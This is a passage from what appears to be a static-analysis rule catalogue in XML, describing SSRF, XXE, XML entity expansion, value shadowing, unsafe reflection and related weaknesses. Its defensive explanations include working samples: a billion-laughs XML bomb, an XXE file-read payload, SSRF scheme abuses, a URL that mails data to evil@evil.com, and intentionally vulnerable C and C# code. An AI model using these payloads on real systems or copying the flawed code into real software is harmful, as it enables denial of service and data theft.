    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_server_side_request_forgery</key>
    <internalKey>Input Validation and Representation/Server-Side Request Forgery</internalKey>
    <name>Server-Side Request Forgery</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application initiates a network connection to a third-party system using user-controlled data to craft the resource URI.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Server-Side Request Forgery occurs when an attacker can influence a network connection made by the application server. The network connection will originate from the application server internal IP and an attacker will be able to use this connection to bypass network controls and scan or attack internal resources that are not otherwise exposed.<br><br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br><b>Example:</b> In the following example, an attacker will be able to control the URL the server is connecting to.<br><br><pre><br>string url = Request.Form["url"];<br>HttpClient client = new HttpClient();<br>HttpResponseMessage response = await client.GetAsync(url);<br></pre><br><br>The ability of the attacker to hijack the network connection will depend on the specific part of the URI that he can control and on libraries used to stablish the connection. For example, controlling the URI scheme will let the attacker use protocols different from <code>http</code> or <code>https</code> like:<br><br>- up://<br>- ldap://<br>- jar://<br>- gopher://<br>- mailto://<br>- ssh2://<br>- telnet://<br>- expect://<br><br>An attacker will be able to leverage this hijacked network connection to perform the following attacks:<br><br>- Port Scanning of intranet resources.<br>- Bypass firewalls.<br>- Attack vulnerable programs running on the application server or on the Intranet.<br>- Attack internal/external web applications using Injection attacks or CSRF.<br>- Access local files using file:// scheme.<br>- On Windows systems, file:// scheme and UNC paths can allow an attacker to scan and access internal shares.<br>- Perform a DNS cache poisoning attack.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 918</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[18]  <em>SSRF bible. Cheatsheet</em> ONSec Labs<br></p>
																									   <p>[19] Alexander Polyakov <em>SSRF vs. Business critical applications</em> BlackHat 2012<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_setting_manipulation</key>
    <internalKey>Input Validation and Representation/Setting Manipulation</internalKey>
    <name>Setting Manipulation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing external control of system settings can disrupt service or cause an application to behave in unexpected ways.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Setting manipulation vulnerabilities occur when an attacker can control values that govern the behavior of the system, manage specific resources, or in some way affect the functionality of the application.<br><br>Because setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 15</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_unsafe_native_invoke</key>
    <internalKey>Input Validation and Representation/Unsafe Native Invoke</internalKey>
    <name>Unsafe Native Invoke</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Improper use of the Platform Invocation Services can render managed applications vulnerable to security flaws in other languages.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Unsafe Native Invoke errors occur when a managed application uses P/Invoke to call native (unmanaged) code written in another programming language.<br><br><br><br><b>Example:</b> The following C# code defines a class named <code>Echo</code>. The class declares one native method (defined below), which uses C to echo commands entered on the console back to the user.<br><br><pre><br>class Echo<br>{<br>  [DllImport("mylib.dll")]<br>  internal static extern void RunEcho();<br><br>  static void main(String[] args)<br>  {<br>    RunEcho();<br>  }<br>}<br></pre><br><br>The following C code defines the native method implemented in the <code>Echo</code> class:<br><br><pre><br>#include &lt;stdio.h&gt;<br><br>void __stdcall RunEcho()<br>{<br>  char* buf = (char*) malloc(64 * sizeof(char));<br>  gets(buf);<br>  printf(buf);<br>}<br></pre><br><br>Because the Echo is implemented in managed code, it may appear that it is immune to memory issues like buffer overflow vulnerabilities. Although the managed environment does do a good job of making memory operations safe, this protection does not extend to vulnerabilities occurring in native code accessed using P/Invoke. Despite the memory protections offered in the managed runtime environment, the native code in this example is vulnerable to a buffer overflow because it makes use of <code>gets()</code>, which does not perform any bounds checking on its input.  As well, <code>buf</code> is allocated but not freed and therefore is a memory leak.<br><br>The vulnerability in the example above could easily be detected through a source code audit of the native method implementation. This may not be practical or possible depending on the availability of source code and the way the project is built, but in many cases it may suffice. However, the ability to share objects between the managed and native environments expands the potential risk to much more insidious cases where improper data handling in managed code may lead to unexpected vulnerabilities in native code or to unsafe operations in native code corrupting data structures in managed code.<br><br>Vulnerabilities in native code accessed through a managed application are typically exploited in the same manner as they are in applications written in the native language. The only challenge to such an attack is for the attacker to identify that the managed application uses native code to perform certain operations. This can be accomplished in a variety of ways, including identifying specific behaviors that are often implemented with native code or by exploiting a system information leak in the managed application that exposes its use of P/Invoke.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 111</em> <br></p>
																									   <p>[8]  <em>How to: Call Native DLLs from Managed Code Using PInvoke</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_unsafe_reflection</key>
    <internalKey>Input Validation and Representation/Unsafe Reflection</internalKey>
    <name>Unsafe Reflection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An attacker may be able to create unexpected control flow paths through the application, potentially bypassing security checks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If an attacker can supply values that the application then uses to determine which class to instantiate or which method to invoke, the potential exists for the attacker to create control flow paths through the application that were not intended by the application developers. This attack vector may allow the attacker to bypass authentication or access control checks or otherwise cause the application to behave in an unexpected manner. Even the ability to control the arguments passed to a given method or constructor may give a wily attacker the edge necessary to mount a successful attack.<br><br><br><b>Example:</b> Programmers often use reflection to implement command dispatchers. The following example shows a command dispatcher that does not utilize reflection:<br><br><pre><br>...<br>Dim ctl As String<br>Dim ao As New Worker()<br>ctl = Request.Form("ctl")<br>If (String.Compare(ctl,"Add") = 0) Then<br>        ao.DoAddCommand(Request)<br>Else If (String.Compare(ctl,"Modify") = 0) Then<br>        ao.DoModifyCommand(Request)<br>Else<br>        App.EventLog("No Action Found", 4)<br>End If<br>...<br></pre><br><br>A programmer might refactor this code to use reflection as follows:<br><br><pre><br>...<br>Dim ctl As String<br>Dim ao As New Worker()<br>ctl = Request.Form("ctl")<br>CallByName(ao, ctl, vbMethod, Request)<br>...<br></pre><br><br>The refactoring initially appears to offer a number of advantages. There are fewer lines of code, the <code>if/else</code> blocks have been entirely eliminated, and it is now possible to add new command types without modifying the command dispatcher.<br><br>However, the refactoring allows an attacker to invoke any method implemented by the <code>Worker</code> object. If the command dispatcher is responsible for access control, then whenever programmers create a new method in the <code>Worker</code> class, they must remember to modify the dispatcher's access control logic. If this access control logic becomes stale, then some <code>Worker</code> methods will not have any access control.<br><br>One way to address this access control problem is to make the <code>Worker</code> object responsible for performing the access control check. An example of the re-refactored code follows:<br><br><pre><br>...<br>Dim ctl As String<br>Dim ao As New Worker()<br>ctl = Request.Form("ctl")<br><b>If (ao.checkAccessControl(ctl,Request) = True) Then</b><br>        CallByName(ao, "Do" &amp; ctl &amp; "Command", vbMethod, Request)<br>End If<br>...<br></pre><br><br>Although this is an improvement, it encourages a decentralized approach to access control, which makes it easier for programmers to make access control mistakes.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 470</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_value_shadowing</key>
    <internalKey>Input Validation and Representation/Value Shadowing</internalKey>
    <name>Value Shadowing</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program accesses a variable in an ambiguous way, which can leave it open to attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The <code>HttpRequest</code> class provides programmatic access to variables from the <code>QueryString</code>, <code>Form</code>, <code>Cookies</code> or <code>ServerVariables</code> collections in the form of an array access (e.g. <code>Request["myParam"]</code>). When more than one variable exists with the same name, the .NET framework returns the value of the variable that appears first when the collections are searched in the following order: <code>QueryString</code>, <code>Form</code>, <code>Cookies</code> then <code>ServerVariables</code>. Because <code>QueryString</code> comes first in the search order, it is possible for <code>QueryString</code> parameters to supersede values from forms, cookies and server variables. Similarly, form values can supersede variables in the <code>Cookies</code> and <code>ServerVariables</code> collections and variables from the <code>Cookies</code> collection can supersede those from <code>ServerVariables</code>.<br><br><br><b>Example 1:</b> Imagine a banking application temporarily stores a user's e-mail address in a cookie and reads this value when it wants to contact the user. The following code reads the cookie value and sends an account balance to the specified e-mail address.<br><pre><br>...<br>    String toAddress = Request["email"];        //Expects cookie value<br>    Double balance = GetBalance(userID);<br>    SendAccountBalance(toAddress, balance);<br>...<br></pre><br>Assume the code above is executed when visiting <code>http://www.example.com/GetBalance.aspx</code>. If an attacker can cause an authenticated user to click a link that requests <code>http://www.example.com/GetBalance.aspx?email=evil%40evil.com</code>, an e-mail with the user's account balance will be sent to <code>evil@evil.com</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_value_shadowing_server_variable</key>
    <internalKey>Input Validation and Representation/Value Shadowing/Server Variable</internalKey>
    <name>Value Shadowing: Server Variable</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program accesses a server variable in an ambiguous way, which can leave it open to attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The <code>HttpRequest</code> class provides programmatic access to variables from the <code>QueryString</code>, <code>Form</code>, <code>Cookies</code> or <code>ServerVariables</code> collections in the form of an array access (e.g. <code>Request["myParam"]</code>). When more than one variable exists with the same name, the .NET framework returns the value of the variable that appears first when the collections are searched in the following order: <code>QueryString</code>, <code>Form</code>, <code>Cookies</code> then <code>ServerVariables</code>. Because <code>QueryString</code> comes first in the search order, it is possible for <code>QueryString</code> parameters to supersede values from forms, cookies and server variables. Similarly, form values can supersede variables in the <code>Cookies</code> and <code>ServerVariables</code> collections and variables from the <code>Cookies</code> collection can supersede those from <code>ServerVariables</code>.<br><br><br><b>Example 1:</b> The following code checks the HTTP Referer header server variable to see if the request came from <code>www.example.com</code> before serving content.<br><pre><br>    ...<br>    if (Request["HTTP_REFERER"].StartsWith("http://www.example.com"))<br>        ServeContent();<br>    else<br>        Response.Redirect("http://www.example.com/");<br>    ...<br></pre><br><br>Assume the code above is executed when visiting <code>http://www.example.com/ProtectedImages.aspx</code>. If an attacker makes a direct request to the URL, the appropriate referer header will not be set and the request will fail. However, if the attacker submits an artificial <code>HTTP_REFERER</code> parameter with the necessary value, such as <code>http://www.example.com/ProtectedImages.aspx?HTTP_REFERER=http%3a%2f%2fwww.example.com</code>, then the lookup will return the value from <code>QueryString</code> instead of <code>ServerVariables</code> and the check will succeed.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Microsoft <em>IIS Server Variables</em> <br></p>
																									   <p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_xml_entity_expansion_injection</key>
    <internalKey>Input Validation and Representation/XML Entity Expansion Injection</internalKey>
    <name>XML Entity Expansion Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using XML parsers configured to not prevent nor limit external entities resolution can expose the parser to an XML Entity Expansion injection attack
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XML Entity Expansion attacks are DoS attacks that benefit from valid and well-formed XML blocks that expand exponentially until they exhaust the server allocated resources. XML allows to define custom entities which act as string substitution macros. By nesting recurrent entity resolutions, an attacker can easily crash the server resources.<br><br>The following XML document shows an example of an XML Bomb.<br><pre><br>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE lolz [<br>  &lt;!ENTITY lol "lol"&gt;<br>  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<br>  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br>  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br>  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<br>  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<br>  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;<br>  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<br>  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br>]&gt;<br>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;<br></pre><br><br>This test could crash the server by expanding the small XML document into more than 3GB in memory.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 776</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Denial of Service</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>
																									   <p>[16]  <em>Testing for XML Injection (OWASP-DV-008)</em> OWASP<br></p>
																									   <p>[17]  <em>XML Denial of Service Attacks and Defenses</em> MSDN Magazine<br></p>
																									   <p>[18]  <em>XML External Entities</em> The Web Application Security Consortium<br></p>
																									   <p>[19]  <em>XML External Entity (XXE) Processing</em> OWASP<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_xml_external_entity_injection</key>
    <internalKey>Input Validation and Representation/XML External Entity Injection</internalKey>
    <name>XML External Entity Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using XML parsers configured to not prevent nor limit external entities resolution can expose the parser to an XML External Entities attack
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XML External Entities attacks benefit from an XML feature to build documents dynamically at the time of processing. An XML entity allows to include data dynamically from a given resource. External entities allow an XML document to include data from an external URI. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML External Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.<br><br>The following XML document shows an example of an XXE attack.<br><pre><br>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br> &lt;!DOCTYPE foo [<br>  &lt;!ELEMENT foo ANY &gt;<br>  &lt;!ENTITY xxe SYSTEM "file:///c:/winnt/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br></pre><br><br>This example could disclose the contents of the C:\winnt\win.ini system file, if the XML parser attempts to substitute the entity with the contents of the file.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3810 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3810 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3810 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3810 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 611</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[18]  <em>Testing for XML Injection (OWASP-DV-008)</em> OWASP<br></p>
																									   <p>[19]  <em>XML Denial of Service Attacks and Defenses</em> MSDN Magazine<br></p>
																									   <p>[20]  <em>XML External Entities</em> The Web Application Security Consortium<br></p>
																									   <p>[21]  <em>XML External Entity (XXE) Processing</em> OWASP<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_xml_injection</key>
    <internalKey>Input Validation and Representation/XML Injection</internalKey>
    <name>XML Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Writing unvalidated data into an XML document can allow an attacker to change the structure and contents of the XML.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XML injection occurs when:<br><br>1. Data enters a program from an untrusted source.<br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br>2. The data is written to an XML document.<br><br>Applications typically use XML to store data or send messages. When used to store data, XML documents are often treated like databases and can potentially contain sensitive information. XML messages are often used in web services and can also be used to send sensitive information. XML message can even be used to send authentication credentials.<br><br>The semantics of XML documents and messages can be altered if an attacker has the ability to write raw XML. In the most benign case, an attacker may be able to insert extraneous tags and cause an XML parser to throw an exception. In more nefarious cases of XML injection, an attacker may be able to add XML elements that change authentication credentials or modify prices in an XML e-commerce database. In some cases, XML injection can even lead to cross-site scripting or dynamic code evaluation.<br><br><b>Example 1:</b><br><br>Assume an attacker is able to control <code>shoes</code> in following XML.<br><pre><br>&lt;order&gt;<br>   &lt;price&gt;100.00&lt;/price&gt;<br>   &lt;item&gt;shoes&lt;/item&gt;<br>&lt;/order&gt;<br></pre><br><br>Now imagine this XML is included in a back end web service request to place an order for a pair of shoes. Suppose the attacker modifies his request and replaces <code>shoes</code> with 